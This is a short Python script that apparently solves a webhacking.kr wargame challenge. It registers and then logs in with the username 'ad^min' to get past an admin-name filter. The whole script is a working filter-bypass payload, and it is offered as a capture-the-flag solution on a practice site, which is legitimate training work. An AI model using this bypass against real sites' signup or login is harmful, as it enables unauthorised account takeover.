import requests

url_join = 'http://webhacking.kr/challenge/bonus/bonus-2/index.php?mode=join'
url = 'http://webhacking.kr/challenge/bonus/bonus-2/index.php'
cookies = {
	'PHPSESSID': ''
}

payloads = {
	'uuid': 'ad^min',
	'pw': 'zero'
}

res = requests.post(url_join, cookies=cookies, data=payloads)
print(res.text)
res = requests.post(url, cookies=cookies, data=payloads)
print(res.text)